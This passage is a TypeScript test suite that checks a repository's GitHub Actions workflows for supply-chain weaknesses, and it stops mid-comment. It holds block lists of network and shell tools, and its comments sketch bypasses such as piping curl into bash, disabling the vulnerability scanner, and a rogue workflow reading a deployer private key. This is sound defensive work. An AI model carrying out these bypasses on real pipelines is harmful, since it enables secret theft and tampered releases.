import { readFileSync, readdirSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { asMapping, asScalar, asSequence, parseYamlSubset, scalars, type YamlValue } from "./yaml-subset.js";

/**
 * `Deploy Test` runs on `pull_request_target`: with the base repository's token
 * and secrets, on a pull request an outside contributor may have authored. Its
 * safety is entirely structural -- which job holds which credential, which
 * revision the guard is read from, which overlay is written -- so it is
 * asserted against the parsed document rather than by reading the file.
 */

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const workflowDirectory = join(repoRoot, ".github", "workflows");

function source(name: string): string {
  return readFileSync(join(workflowDirectory, name), "utf8");
}

function workflow(name: string): { readonly [key: string]: YamlValue } {
  return asMapping(parseYamlSubset(source(name)), name);
}

function jobs(name: string): { readonly [key: string]: YamlValue } {
  return asMapping(workflow(name)["jobs"]!, `${name} jobs`);
}

function job(name: string, id: string): { readonly [key: string]: YamlValue } {
  const found = jobs(name)[id];
  if (found === undefined) throw new Error(`${name} has no ${id} job`);
  return asMapping(found, `${name}.${id}`);
}

function steps(name: string, id: string): Array<{ readonly [key: string]: YamlValue }> {
  return asSequence(job(name, id)["steps"]!, `${name}.${id}.steps`).map((step, index) =>
    asMapping(step, `${name}.${id}.steps[${index}]`),
  );
}

/** Everything the job's steps would run or reference, as one searchable string. */
function jobText(name: string, id: string): string {
  return scalars(job(name, id)).join("\n");
}

/**
 * Every reference to the `secrets` context reachable by one job: its own
 * mapping, plus the workflow's root `env:`, which a job with no `env:` of its
 * own inherits silently. `jobText` -- `scalars(job(...))` alone -- never
 * reads the document root, so a `secrets.*` reference placed there was
 * invisible to every credential-boundary assertion regardless of which job it
 * reached.
 *
 * Matches the *context*, not one spelling of it, in two senses. `/secrets\.
 * [A-Za-z0-9_]+/` finds `secrets.NAME` and nothing else: `secrets['NAME']`
 * (bracket indexing, identical at runtime) and `toJSON(secrets)` (the whole
 * context, deployer private key included) both reach a job undetected under
 * that pattern -- the mapping and bracket-indexing alternation below closes
 * that. Separately, and previously missed: the runner resolves context names
 * with `StringComparer.OrdinalIgnoreCase`, so `SECRETS.NAME` and
 * `Secrets.NAME` spend the identical context `secrets.NAME` does and both
 * survived a case-sensitive `\bsecrets\b` -- the `i` flag below is what
 * makes "matches the context, not one spelling of it" true of the context
 * keyword's case as well as its indexing syntax. Scoped to `${{ … }}`
 * expressions -- the only place GitHub Actions ever evaluates `secrets` --
 * so an English sentence in a shell comment that happens to contain the word
 * "secrets" cannot make this fire; expression syntax is what actually spends
 * the context.
 *
 * Recorded, not modelled (review pass 5): `secrets: inherit`, the
 * reusable-workflow-call keyword that hands a called workflow every secret
 * the caller holds, is not an `${{ … }}` expression and this function does
 * not look for it. Not exploitable in either of this row's two files today
 * -- neither `release.yml` nor `deploy-test.yml` calls a reusable workflow
 * at all -- so there is nothing for this keyword to appear on, but a future
 * job that does would need its own check, not this one.
 */
function secretsReferenced(name: string, id: string): string[] {
  const rootEnv = workflow(name)["env"];
  const text = [jobText(name, id), rootEnv === undefined ? "" : scalars(rootEnv).join("\n")].join(
    "\n",
  );
  const references: string[] = [];
  for (const [, expression] of text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)) {
    for (const match of expression!.matchAll(
      /\bsecrets\b(?:\s*\.\s*([A-Za-z0-9_]+)|\s*\[\s*(['"])([A-Za-z0-9_]+)\2\s*\])?/gi,
    )) {
      const named = match[1] ?? match[3];
      // No captured name means the whole context was handed over as a value
      // -- `toJSON(secrets)`, `fromJSON(secrets).NAME`, a bare `secrets` in a
      // comparison -- which is strictly worse than any one named secret and
      // must fail every assertion a single named leak would.
      references.push(named === undefined ? "secrets" : `secrets.${named}`);
    }
  }
  return references;
}

/** Every value of a `uses` key reachable from `value`, at any depth. */
function usesReferences(value: YamlValue): string[] {
  if (typeof value === "string") return [];
  if (Array.isArray(value)) return value.flatMap((item) => usesReferences(item));
  return Object.entries(value).flatMap(([key, item]) =>
    key === "uses" ? [asScalar(item, "uses")] : usesReferences(item),
  );
}

/** Every mapping key reachable from `value`, at any depth. */
function keysOf(value: YamlValue): string[] {
  if (typeof value === "string") return [];
  if (Array.isArray(value)) return value.flatMap((item) => keysOf(item));
  return Object.entries(value).flatMap(([key, item]) => [key, ...keysOf(item)]);
}

/** A step's `with:` block, or an empty mapping when it declares none. */
function withBlock(
  step: { readonly [key: string]: YamlValue },
  path: string,
): { readonly [key: string]: YamlValue } {
  return step["with"] === undefined ? {} : asMapping(step["with"], `${path}.with`);
}

/**
 * A `uses:` line, however the step is laid out. When `uses` is a step's first
 * key it carries the sequence dash -- `- uses: …` -- which GitHub Actions
 * accepts and an expression anchored to `^\s*uses:` does not match.
 */
const USES_LINE = /^\s*(?:-\s+)?uses:/gm;

/** The pin check, as applied to one workflow's source. */
function expectEveryActionPinned(name: string, text: string): void {
  // Read from the parsed document, not from the source. A line-anchored
  // `uses:\s*(\S+)$` cannot match a line carrying a trailing comment --
  // which GitHub Actions accepts -- so `uses: x@main # pinned` was never
  // collected and never checked. The parser keeps the comment in the value,
  // which is what makes it fail the pin pattern below.
  const references = usesReferences(parseYamlSubset(text));
  expect(references.length).toBeGreaterThan(0);
  // Every `uses:` in the file must be one of the references checked: a
  // reference the traversal cannot reach is a reference nothing pins.
  expect(references.length).toBe([...text.matchAll(USES_LINE)].length);
  for (const reference of references) {
    expect(reference, `${name} does not pin ${reference}`).toMatch(/^[^@\s]+@[0-9a-f]{40}$/);
  }
}

/** Each pinned `uses:` reference paired with the comment line above it. */
function pinAnnotations(name: string): Array<readonly [string, string]> {
  const lines = source(name).split("\n");
  return lines.flatMap((line, index) => {
    const reference = /^\s*(?:-\s+)?uses:\s*(\S+)/.exec(line)?.[1];
    if (reference === undefined) return [];
    const previous = lines[index - 1] ?? "";
    const comment = /^\s*#\s*(.*)$/.exec(previous)?.[1];
    expect(comment, `${name}:${index + 1} pins ${reference} with no comment saying what it is`)
      .toBeDefined();
    return [[reference, comment!] as const];
  });
}

const DEPLOY_TEST = "deploy-test.yml";
const RELEASE = "release.yml";
const VALIDATE = "validate.yml";

/**
 * The one `docker buildx build` the workflow publishes both its images with:
 * the step declaring it, that step's whole script, and the invocation itself
 * folded to a single line.
 *
 * The images are published by calling one shell function twice, so one
 * invocation carries every flag that applies to both. That is why the count
 * is asserted here rather than left implicit -- split into two invocations
 * and any per-invocation guarantee below could hold for one image and not the
 * other, while a check that merely found *a* correct build stayed green.
 */
function publishInvocation(name: string): {
  readonly step: { readonly [key: string]: YamlValue };
  readonly script: string;
  readonly invocation: string;
} {
  const publishing = Object.keys(jobs(name)).flatMap((id) =>
    steps(name, id).filter(
      (step) => typeof step["run"] === "string" && step["run"].includes("docker buildx build"),
    ),
  );
  expect(publishing, `${name} does not publish its images from exactly one step`).toHaveLength(1);
  const step = publishing[0]!;
  const script = asScalar(step["run"]!, `${name} publish run`);
  const invocations = commands(script).filter((line) => line.includes("docker buildx build"));
  expect(invocations, `${name} does not build both images with one invocation`).toHaveLength(1);
  return { step, script, invocation: invocations[0]! };
}

/**
 * The digest guard, held to two things a substring match and an `indexOf`
 * ordering check never actually establish: that the guarded line is the
 * *exact* command -- `printf … | grep -Eq '…' || true` still `.includes()`
 * the same pattern while being unable to fail -- and that nothing sits
 * between the guard and the line that emits the value it just approved. An
 * `indexOf` "before"/"after" pair is satisfied by a reassignment inserted
 * anywhere in between: `digest="${image}:sha-${SOURCE_SHA}"` between the
 * guard and the emit passes the guard, then overwrites its own subject with
 * a floating tag before `promote` ever sees it. Adjacency in the folded
 * command list -- not position in the raw string -- is what closes that.
 *
 * MAJOR 4 (review pass 2): adjacency alone proves *a* guarded emit exists;
 * it does not prove the guarded one is the *last* write to `$GITHUB_OUTPUT`.
 * `$GITHUB_OUTPUT` is a file every `echo … >>` appends to, and the runner
 * takes the last line for a given key -- so a second, unguarded write
 * anywhere else in the script, run after the guarded one, is what `promote`
 * actually reads. Matching the exact `EMIT` string a second time is not
 * enough: `echo "backend_digest=sha256:1111…" >>"$GITHUB_OUTPUT"` -- a
 * hardcoded key and value rather than the parameterised form -- writes the
 * identical file with a string that never equals `EMIT` at all, and
 * survived an equality-based uniqueness check. This instead counts every
 * command that writes to `$GITHUB_OUTPUT` by any spelling and requires
 * there to be exactly one in the whole script -- which there is, today,
 * because `publish()` is one shell function called twice, so the one write
 * this file's own source contains is the only one either invocation ever
 * makes.
 *
 * MAJOR 1 (review pass 3): the first version of this uniqueness check
 * matched the literal substring `'"$GITHUB_OUTPUT"'` -- with the quotes.
 * `>>$GITHUB_OUTPUT` (unquoted, word-split but harmless here, since nothing
 * follows it on the line) and `tee -a $GITHUB_OUTPUT` are the same write by
 * a different spelling and matched nothing, letting a `trap` write survive
 * on a quote character alone. `GITHUB_OUTPUT_PATTERN` below matches the
 * variable however it is written -- `$GITHUB_OUTPUT` or `${GITHUB_OUTPUT}`,
 * quoted or not -- so the count is independent of both the redirection form
 * and the quoting style.
 */
const GITHUB_OUTPUT_PATTERN = /\$\{?GITHUB_OUTPUT\}?/;

function expectDigestGuardedAndEmittedUnchanged(script: string): void {
  const DIGEST_ASSIGNMENT = 'digest="$(jq -er \'."containerimage.digest"\' "$metadata")"';
  const GUARD = `printf '%s' "$digest" | grep -Eq '^sha256:[0-9a-f]{64}$'`;
  const EMIT = 'echo "${output}=$digest" >>"$GITHUB_OUTPUT"';
  const cmds = commands(script);
  const assignIndex = cmds.indexOf(DIGEST_ASSIGNMENT);
  expect(assignIndex, "no line assigns digest from the build metadata").toBeGreaterThanOrEqual(0);
  const guardIndices = cmds.reduce<number[]>(
    (found, command, index) => (command === GUARD ? [...found, index] : found),
    [],
  );
  expect(
    guardIndices,
    "no line guards the extracted digest's shape exactly and unconditionally",
  ).toHaveLength(1);
  expect(
    guardIndices[0],
    "the guard does not run on the command immediately after the digest assignment",
  ).toBe(assignIndex + 1);
  expect(
    cmds[guardIndices[0]! + 1],
    "a command sits between the guard and the value it approves reaching GITHUB_OUTPUT",
  ).toBe(EMIT);
  expect(
    cmds.filter((command) => GITHUB_OUTPUT_PATTERN.test(command)),
    "the guarded emit is not the only write to GITHUB_OUTPUT in this script -- a later, unguarded one would win",
  ).toHaveLength(1);
}

/** A pinned scanner release, e.g. `v0.70.0`. */
const TRIVY_VERSION = /^v\d+\.\d+\.\d+$/;

/** Every Trivy scan step in a workflow, paired with where it was found. */
function trivyScans(
  name: string,
): Array<readonly [string, { readonly [key: string]: YamlValue }]> {
  return Object.keys(jobs(name)).flatMap((id) =>
    steps(name, id)
      .map((step, index) => [`${id}.steps[${index}]`, step] as const)
      .filter(
        ([, step]) => typeof step["uses"] === "string" && step["uses"].includes("trivy-action@"),
      ),
  );
}

/**
 * The exact `with:` keys the two scan steps declare today. Closed, not a
 * lower bound: `expect(inputs["severity"]).toBe(…)` reads named keys and
 * never asks what else is in the mapping, so `skip-dirs: /` -- or
 * `trivyignores:`, `skip-files:`, `trivy-config:` naming a file that turns
 * every finding into a suppressed one -- sat beside every asserted input,
 * untouched, entirely outside what any of those checks could see.
 */
const TRIVY_INPUTS = [
  "exit-code",
  "format",
  "ignore-unfixed",
  "image-ref",
  "output",
  "scanners",
  "severity",
  "version",
  "vuln-type",
].sort();

/**
 * Both Trivy scans in one workflow, held to being a **gate** rather than a
 * report.
 *
 * The `with:` inputs are only half of it, and they were the whole of what a
 * check like this could assert without reading further. `severity: CRITICAL`
 * and `exit-code: '1'` say what the scanner looks for and what it exits with;
 * neither says the step runs, and neither says the job fails when it does. A
 * `continue-on-error: true` beside those inputs, or an `if:` that is false,
 * leaves every input assertion true and removes the gate outright -- and
 * `promote` needs `build`, so failing the build job is the only thing
 * standing between a CRITICAL finding and the overlay. So the step declares
 * no condition and no error tolerance at all, and neither does the job
 * holding it: a job-level `continue-on-error` would report success to
 * `needs` however the scan concluded.
 *
 * Neither half -- `with:` or the surrounding `env:` -- was previously closed.
 * `TRIVY_INPUTS` closes the first: an input this test does not name is now a
 * failure, not silence. The second is `entrypoint.sh`'s own contract at the
 * pinned SHA (`ed142fd…`): it reads `TRIVY_CMD="${TRIVY_CMD:-trivy}"` before
 * running anything, so `TRIVY_CMD: /bin/true` -- set on the step or, since a
 * job's `env:` reaches every step in it, on the job -- replaces the scanner
 * outright while every `with:` input above stays exactly as asserted. The
 * step declares no `env:` today, so its absence is required outright, and
 * the job's `env:` (real today only on `build`, for `SOURCE_SHA`) is checked
 * for that one name rather than being forced empty.
 *
 * The scanner version is pinned here for a narrower reason than "otherwise it
 * floats": the action is pinned by commit SHA, and at that SHA `version:`'s
 * own default in `action.yaml` is already `v0.70.0` -- the same value this
 * asserts -- so an *absent* `version:` is exactly as deterministic as this
 * pin, today. What an absent pin does not survive is the SHA-pinned action's
 * bundled default changing on some future edit to this file with nobody
 * re-checking it; an explicit `version:` is what makes that change visible
 * here rather than silent. A *floating* `version: latest`, unlike an absent
 * one, changes the gate's strictness independent of any edit to this file at
 * all, which is what pinning to a release shape (`TRIVY_VERSION`) guards
 * against. `vuln-type` is pinned for the same reason, not because omitting it
 * changes anything today: `action.yaml`'s own default is already
 * `os,library`, and `set_env_var_if_provided` skips the export entirely when
 * an input equals its default, so an absent `vuln-type:` is byte-identical to
 * this asserted one. The value that would actually narrow the scan --
 * `vuln-type: os`, dropping the Node dependency tree -- is exactly what
 * asserting the value, rather than its absence, refuses.
 *
 * `TRIVY_CMD` reaches `entrypoint.sh` from four scopes, not two: the step's
 * own `env:`, the job's `env:` -- both closed above -- **and** the workflow
 * root's `env:` (a job with none of its own inherits it, the same hole
 * `secretsReferenced` closes for `secrets`), **and** `$GITHUB_ENV`, which any
 * earlier step in the job can append to and every later step -- this scan
 * step included -- inherits as real process environment regardless of the
 * job's or step's own declared `env:` mapping. `entrypoint.sh` reads
 * `TRIVY_CMD="${TRIVY_CMD:-trivy}"` *before* sourcing `trivy_envs.txt`, and
 * `trivy_envs.txt` never sets it, so nothing the `with:` block exports can
 * reclaim it once any of the four has set it. `TRIVY_SEVERITY` by contrast
 * is inert via `$GITHUB_ENV`: `trivy_envs.txt` is sourced afterwards and
 * wins. `TRIVY_CMD` is the one variable with no backstop, which is why it
 * alone is checked this exhaustively.
 */
function expectTrivyGate(name: string, imageRefs: readonly string[]): void {
  const scans = trivyScans(name);
  expect(
    scans.map(([where]) => where),
    `${name} does not declare exactly two Trivy scans`,
  ).toHaveLength(2);
  expect(scans.map(([where, step]) => withBlock(step, where)["image-ref"])).toEqual(imageRefs);

  const versions = new Set<string>();
  for (const [where, step] of scans) {
    const jobId = where.split(".")[0]!;
    expect(
      step["if"],
      `${name}.${where} is conditional, so a scan that never runs cannot fail the job`,
    ).toBeUndefined();
    expect(
      step["continue-on-error"],
      `${name}.${where} tolerates its own failure, so a CRITICAL finding would not fail the job`,
    ).toBeUndefined();
    expect(
      job(name, jobId)["continue-on-error"],
      `${name}.${jobId} tolerates a failed step, so promotion would proceed past a CRITICAL finding`,
    ).toBeUndefined();
    expect(
      step["env"],
      `${name}.${where} carries a step-level env: that could override TRIVY_CMD`,
    ).toBeUndefined();
    const jobEnv = job(name, jobId)["env"];
    if (jobEnv !== undefined) {
      expect(
        Object.keys(asMapping(jobEnv, `${name}.${jobId}.env`)),
        `${name}.${jobId} sets a job-level TRIVY_CMD, replacing the scanner entrypoint downloads`,
      ).not.toContain("TRIVY_CMD");
    }
    const rootEnv = workflow(name)["env"];
    if (rootEnv !== undefined) {
      expect(
        Object.keys(asMapping(rootEnv, `${name}.env`)),
        `${name} sets a workflow-root TRIVY_CMD, which every job with no env: of its own inherits`,
      ).not.toContain("TRIVY_CMD");
    }
    expect(
      jobText(name, jobId),
      `${name}.${jobId} writes TRIVY_CMD to $GITHUB_ENV, reclaiming it for every later step`,
    ).not.toMatch(/TRIVY_CMD/);

    const inputs = withBlock(step, `${name}.${where}`);
    expect(
      Object.keys(inputs).sort(),
      `${name}.${where} declares an input this test does not close the set on`,
    ).toEqual(TRIVY_INPUTS);
    expect(inputs["severity"]).toBe("CRITICAL");
    expect(inputs["exit-code"]).toBe("1");
    expect(inputs["ignore-unfixed"]).toBe("true");
    expect(inputs["scanners"]).toBe("vuln");
    expect(
      inputs["vuln-type"],
      `${name}.${where} does not scan both the OS packages and the dependency tree`,
    ).toBe("os,library");
    expect(
      inputs["version"],
      `${name}.${where} does not pin the scanner the action downloads`,
    ).toBeDefined();
    const version = asScalar(inputs["version"]!, `${name}.${where}.with.version`);
    expect(version, `${name}.${where} pins no Trivy release`).toMatch(TRIVY_VERSION);
    versions.add(version);
  }
  expect(
    [...versions],
    `${name} scans its two images with different Trivy versions`,
  ).toHaveLength(1);
}

/** Each `run:` body in one job, paired with the step index holding it. */
function jobScripts(name: string, id: string): Array<readonly [number, string]> {
  return steps(name, id).flatMap((step, index) =>
    step["run"] === undefined
      ? []
      : [[index, asScalar(step["run"], `${name}.${id}.steps[${index}].run`)] as const],
  );
}

/** Every `run:` body in a workflow, paired with where it was found. */
function everyScript(name: string): Array<readonly [string, string]> {
  return Object.keys(jobs(name)).flatMap((id) =>
    jobScripts(name, id).map(([index, script]) => [`${id}.steps[${index}]`, script] as const),
  );
}

/**
 * Shell lines with `\` continuations folded, so one command is one entry, and
 * comment lines dropped, so prose about a command is not mistaken for one.
 *
 * The dropping matters: every check below is a search for something a script
 * must not do, and a comment saying "this deliberately does not run `npm
 * install`" is the sentence most likely to be written next to a script that
 * deliberately does not run `npm install`.
 */
function commands(script: string): string[] {
  const folded: string[] = [];
  for (const line of script.split("\n")) {
    const previous = folded[folded.length - 1];
    if (previous !== undefined && previous.endsWith("\\")) {
      folded[folded.length - 1] = `${previous.slice(0, -1).trimEnd()} ${line.trim()}`;
    } else {
      folded.push(line.trim());
    }
  }
  return folded.filter((line) => !line.startsWith("#"));
}

/**
 * Every `run:` body that interpolates a workflow expression into the shell.
 *
 * `${{ … }}` is substituted into the script *before* a shell ever sees it, so
 * an expression carrying head-controlled text -- a PR title, a branch name --
 * becomes head-controlled shell in a job that may hold a credential. Every
 * workflow here passes values through `env:` instead, where they arrive as
 * shell variables and stay data. Read from the **parsed** (and, for a block
 * scalar, folded) string: a `>-` folded body can carry `${{` and `}}` on two
 * different physical lines of source, which a single-line grep pattern such
 * as `\$\{\{.*\}\}` does not span but the folded string does.
 */
function interpolationOffences(scripts: ReadonlyArray<readonly [string, string]>): string[] {
  return scripts.filter(([, body]) => body.includes("${{")).map(([where]) => where);
}

/**
 * One folded line split at the shell's own command boundaries, so a check on
 * "the command" is not fooled by `true && git fetch origin`.
 */
function logicalCommands(line: string): string[] {
  return line
    .split(/&&|\|\||[;|]/)
    .map((part) => part.trim())
    .filter((part) => part.length > 0);
}

/**
 * Everything a promoting job is allowed to do with `git`.
 *
 * An allowlist, not a blacklist of forbidden subcommands: a blacklist that
 * requires the subcommand to follow `git` immediately walks straight past
 * `git -C gitops fetch origin pull/1/head` -- and `git -C <path>` is the form
 * `scripts/update-gitops-digest.sh` and `promote` both use throughout.
 */
const GIT_SUBCOMMANDS: readonly string[] = ["config", "add", "diff", "commit", "push"];

/**
 * `git` as the start of a command: at the start of a logical command, after
 * whitespace, or inside a substitution -- `staged="$(git diff …)"` is a real
 * invocation and must be checked. Deliberately not `\bgit\b`, which also
 * matches the `.git` at the end of a push URL and would fail the one line the
 * job exists to run.
 *
 * The command word is matched on its **basename**, because a command word is
 * a path: an expression anchored on a bare `git` refuses `git -C gitops
 * fetch` and admits `/usr/bin/git -C gitops fetch`, the same invocation
 * spelled the way anyone routing around an allowlist would spell it.
 */
const GIT_INVOCATION = /(?:^|[\s(`{])(?:[^\s]*\/)?git\s+/g;

/** Every `git` invocation in one logical command that is not on the allowlist. */
function gitOffences(command: string): string[] {
  const offences: string[] = [];
  for (const match of command.matchAll(GIT_INVOCATION)) {
    const rest = command.slice(match.index + match[0].length).trim().split(/\s+/);
    // `-C <path>` is tolerated and nothing else is: it selects the worktree,
    // not the operation.
    const subcommand = rest[0] === "-C" ? rest[2] : rest[0];
    if (subcommand === undefined || !GIT_SUBCOMMANDS.includes(subcommand)) {
      offences.push(`git ${subcommand ?? "(nothing)"}`);
    }
  }
  return offences;
}

const FORBIDDEN_COMMANDS: ReadonlyArray<readonly [string, RegExp]> = [
  ["reaches GitHub through the gh CLI", /\bgh\s+(?:pr|repo|api|run|release)\b/],
  ["runs a Node package manager", /\b(?:npm|npx|pnpm|yarn)\b/],
  ["builds or runs a container", /\bdocker\s+(?:build|run)\b/],
];

/**
 * Interpreters, and a couple of long-dead-but-still-real fetchers, `promote`
 * never legitimately invokes as a word -- checked without regard to
 * position. The blacklist this replaced matched only `curl … | sh|bash|
 * node|python`, i.e. one fetcher, piped, into one of four interpreters: it
 * missed `wget` outright, missed `bash <(curl …)` (no pipe at all), and
 * missed a fetch staged across separate commands (`curl -o x; chmod +x x;
 * ./x`) since no single line combined a fetch with an execution. This checks
 * every word, in every position, in every logical command.
 */
const BANNED_REMOTE_WORDS = /\b(wget|ftp|nc|ncat|python3?|perl|ruby|node)\b/;

/**
 * The one shell invocation `promote` legitimately makes: the deploys
 * repository's own, already-checked-out manifest test -- content that
 * arrived via `actions/checkout` of `hannosirkel/deploys`, never from the
 * head. An allowlist of that one exact shape, not a blacklist of shapes
 * imagined in advance: `sh`, `bash`, `zsh`, `dash` or `ksh` heading anything
 * else -- `bash <(curl …)`, `sh /tmp/hook.sh` -- is refused.
 */
const SHELL_INVOCATION = /(?:^|[\s;&|(`])(sh|bash|zsh|dash|ksh)(?:\s|$)/;
const ALLOWED_SHELL_INVOCATION = "bash lousydeal/tests/manifests.sh";

/**
 * `curl` never legitimately writes its response to a file in this job --
 * both real calls pipe straight to a variable -- and never uses a fused
 * short-flag cluster; both real calls spell every flag long
 * (`--fail --silent --show-error`, never `-fsS`). `-sSLo file` is refused by
 * the short-flag rule without needing to recognise `-o` as its own token,
 * which a cluster like `-sSLo` never presents it as.
 */
function curlOffence(command: string): string | undefined {
  if (!/\bcurl\b/.test(command)) return undefined;
  const withoutLongFlags = command.replace(/--[A-Za-z-]+(?:=\S+)?/g, "");
  if (/(?:^|\s)-[A-Za-z]/.test(withoutLongFlags)) {
    return `uses a short curl flag, which this job's real calls never do: ${command}`;
  }
  if (/--output\b|(?:^|\s)>/.test(command)) {
    return `writes curl's output to a file: ${command}`;
  }
  return undefined;
}

/**
 * Everything one logical command does that a job holding the GitOps
 * credential must not. `allowedShellInvocation` is the one shape a shell
 * interpreter word is tolerated in -- `promote`'s manifest test by default;
 * `undefined` for a job (`build`, see `buildRemoteCodeOffences`) with no
 * legitimate shell invocation of its own to allow at all.
 */
function remoteCodeOffences(
  command: string,
  allowedShellInvocation: string | undefined = ALLOWED_SHELL_INVOCATION,
): string[] {
  const offences: string[] = [];
  const banned = BANNED_REMOTE_WORDS.exec(command);
  if (banned !== null) offences.push(`invokes ${banned[1]}: ${command}`);
  if (SHELL_INVOCATION.test(command) && command.trim() !== allowedShellInvocation) {
    offences.push(`invokes a shell interpreter outside its one allowed shape: ${command}`);
  }
  const curl = curlOffence(command);
  if (curl !== undefined) offences.push(curl);
  return offences;
}

/**
 * M-g: `build` is not `promote` -- it legitimately runs `docker buildx
 * build` and, via the `publish` shell function, `docker login`, both banned
 * outright for `promote` -- so `codeImportOffences`'s full allowlist does
 * not apply to it, and `release.yml:57-58`'s "holds no GitOps credential"
 * does not mean "holds no credential at all": `packages: write` is one too, spent
 * in this same job. What is still refused here: a remote fetcher, a bare
 * shell/interpreter invocation (`build` has no legitimate one at all, unlike
 * `promote`'s one exact manifest-test shape, so none is allowlisted), or
 * curl misused the way `promote`'s own rules refuse. Before this, a step
 * that curled a script and piped it to `bash` in the job that publishes to
 * GHCR had nothing here refusing it.
 */
function buildRemoteCodeOffences(scripts: ReadonlyArray<readonly [number, string]>): string[] {
  const offences: string[] = [];
  for (const [index, script] of scripts) {
    for (const line of commands(script)) {
      for (const command of logicalCommands(line)) {
        for (const offence of remoteCodeOffences(command, undefined)) {
          offences.push(`steps[${index}] ${offence}`);
        }
      }
    }
  }
  return offences;
}

/**
 * Everything wrong with the `run:` bodies of a job that holds the GitOps
 * credential: code arriving (by `git`, by a fetcher, by an interpreter, or by
 * `curl` writing a file it could later execute), or an expression being
 * interpolated into a shell.
 */
function codeImportOffences(scripts: ReadonlyArray<readonly [number, string]>): string[] {
  const offences: string[] = [];
  for (const [index, script] of scripts) {
    for (const line of commands(script)) {
      for (const [what, pattern] of FORBIDDEN_COMMANDS) {
        if (pattern.test(line)) offences.push(`steps[${index}] ${what}: ${line}`);
      }
      for (const command of logicalCommands(line)) {
        for (const offence of gitOffences(command)) {
          offences.push(`steps[${index}] runs ${offence}: ${command}`);
        }
        for (const offence of remoteCodeOffences(command)) {
          offences.push(`steps[${index}] ${offence}`);
        }
      }
    }
  }
  return offences;
}

/**
 * The runner's own file-based communication channels: appending to
 * `$GITHUB_OUTPUT`, `$GITHUB_ENV`, `$GITHUB_PATH` or `$GITHUB_STEP_SUMMARY`
 * is how a step is meant to hand a value to a later step, later job, or the
 * run summary. Declaring one of these names in a step's or job's own `env:`
 * overrides which *file* every subsequent `>>` in that scope actually
 * writes to (or, for `GITHUB_ENV`/`GITHUB_PATH`, which file a later step
 * reads its inherited environment or PATH from) -- `GITHUB_OUTPUT:
 * /dev/null` on the one step that emits both published digests silently
 * discards them, and every check on that step's script text stays green,
 * because none of them inspects the runner's own environment, only the
 * script.
 *
 * M8 (review pass 3): the first version of this check read job- and
 * step-level `env:` only. `secretsReferenced` and `expectTrivyGate` both
 * close the identical hole at the workflow root -- a job with no `env:` of
 * its own inherits it -- and this one did not, inconsistently: a
 * workflow-root `GITHUB_OUTPUT: /dev/null` was fail-closed today only
 * because nothing had tried it, not because this check would have caught
 * it.
 */
const RESERVED_RUNNER_ENV = ["GITHUB_OUTPUT", "GITHUB_ENV", "GITHUB_PATH", "GITHUB_STEP_SUMMARY"];

/** Every reserved runner env-var name reassigned in `name`.`id`'s root-, job- or step-level `env:`. */
function reservedEnvOffences(name: string, id: string): string[] {
  const offences: string[] = [];
  const rootEnv = workflow(name)["env"];
  if (rootEnv !== undefined) {
    for (const key of Object.keys(asMapping(rootEnv, `${name}.env`))) {
      if (RESERVED_RUNNER_ENV.includes(key)) offences.push(`root.env.${key}`);
    }
  }
  const jobEnv = job(name, id)["env"];
  if (jobEnv !== undefined) {
    for (const key of Object.keys(asMapping(jobEnv, `${name}.${id}.env`))) {
      if (RESERVED_RUNNER_ENV.includes(key)) offences.push(`${id}.env.${key}`);
    }
  }
  for (const [index, step] of steps(name, id).entries()) {
    const stepEnv = step["env"];
    if (stepEnv === undefined) continue;
    for (const key of Object.keys(asMapping(stepEnv, `${name}.${id}.steps[${index}].env`))) {
      if (RESERVED_RUNNER_ENV.includes(key)) offences.push(`${id}.steps[${index}].env.${key}`);
    }
  }
  return offences;
}

describe("every workflow in this repository", () => {
  // MAJOR 5 (review pass 4): `entry.endsWith(".yml")` -- GitHub Actions
  // discovers `.github/workflows/*.yaml` too, and every credential-boundary
  // guarantee in this file was scoped to the two files named by `RELEASE`
  // and `DEPLOY_TEST`, never to "whatever `readdirSync` found". A new
  // `.github/workflows/exfil.yaml` declaring `environment: live` and a
  // `run:` step reading `secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY` was never
  // read by this suite at all -- not refused, not even seen. Both
  // extensions GitHub Actions itself recognises are discovered now.
  const names = readdirSync(workflowDirectory).filter(
    (entry) => entry.endsWith(".yml") || entry.endsWith(".yaml"),
  );

  it("includes the validation, test-promotion and release workflows", () => {
    expect(names).toContain(VALIDATE);
    expect(names).toContain(DEPLOY_TEST);
    expect(names).toContain(RELEASE);
  });

  it("declares the deployer credential and the live/test environments in no workflow but the two that use them", () => {
    // The other half of MAJOR 5: discovering `.yaml` files is only useful if
    // something then reads them for the shape that matters. A workflow
    // outside `release.yml`/`deploy-test.yml` that names `environment: live`
    // or `environment: test`, or references either
    // `secrets.LOUSYDEAL_DEPLOYER_CLIENT_ID` or
    // `secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY` (case-insensitively, per
    // MAJOR 5 pass 2 -- the runner resolves context names
    // `OrdinalIgnoreCase`), reaches the GitOps deployer's credential or its
    // protected environments without a single one of the checks scoped to
    // `RELEASE`/`DEPLOY_TEST` ever looking at it.
    //
    // Read from the parsed document, not a source regex: `environment:` has
    // two forms GitHub Actions treats identically -- the scalar
    // `environment: live` a regex like `/environment:\s*live\b/` catches,
    // and the mapping `environment:\n  name: live` it does not, because
    // `name:` never sits on the same line as `environment:`. A fixture using
    // only the mapping form passed every check in this file unnoticed until
    // this was rewritten to read `job(name, id)["environment"]` itself,
    // handling both. `secretsReferenced` -- already hardened against
    // bracket indexing, `toJSON(secrets)`, and root-`env:` inheritance --
    // is reused for the credential half rather than a second regex.
    for (const name of names) {
      if (name === RELEASE || name === DEPLOY_TEST) continue;
      for (const id of Object.keys(jobs(name))) {
        const path = `${name}.${id}`;
        const env = job(name, id)["environment"];
        if (env !== undefined) {
          const envName =
            typeof env === "string" ? env : asMapping(env, `${path}.environment`)["name"];
          if (envName !== undefined) {
            expect(
              asScalar(envName, `${path}.environment.name`),
              `${path} declares a live/test environment`,
            ).not.toMatch(/^(live|test)$/);
          }
        }
        const deployerSecrets = secretsReferenced(name, id).filter((reference) =>
          /LOUSYDEAL_DEPLOYER_/i.test(reference),
        );
        expect(deployerSecrets, `${path} references the GitOps deployer credential`).toEqual([]);
      }
    }
  });

  it("declares only name, on, concurrency, permissions and jobs at the workflow root", () => {
    // MAJOR 3 (review pass 4): nothing asserted `Object.keys(workflow(name))`
    // itself. Root `env:` was frisked for `TRIVY_CMD`, the four `GITHUB_*`
